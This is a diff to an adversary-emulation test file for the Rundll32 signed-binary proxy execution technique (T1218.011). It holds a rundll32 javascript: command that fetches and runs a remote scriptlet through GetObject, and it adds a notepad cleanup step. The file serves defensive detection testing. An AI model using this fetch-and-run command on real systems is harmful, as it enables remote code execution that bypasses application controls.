@@ -2,7 +2,7 @@ attack_technique: T1218.011
 display_name: 'Signed Binary Proxy Execution: Rundll32'
 atomic_tests:
 - name: Rundll32 execute JavaScript Remote Payload With GetObject
-  auto_generated_guid: cf3bdb9a-dd11-4b6c-b0d0-9e22b68a71be
+  auto_generated_guid: 57ba4ce9-ee7a-4f27-9928-3c70c489b59d
   description: |
     Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened.
   supported_platforms:
@@ -14,7 +14,9 @@ atomic_tests:
       default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct
   executor:
     command: |
-      rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();
+      rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();window.close();
+    cleanup_command: |
+      taskkill /IM notepad.exe /f
     name: command_prompt
 - name: Rundll32 execute VBscript command
   auto_generated_guid: 638730e7-7aed-43dc-bf8c-8117f805f5bb
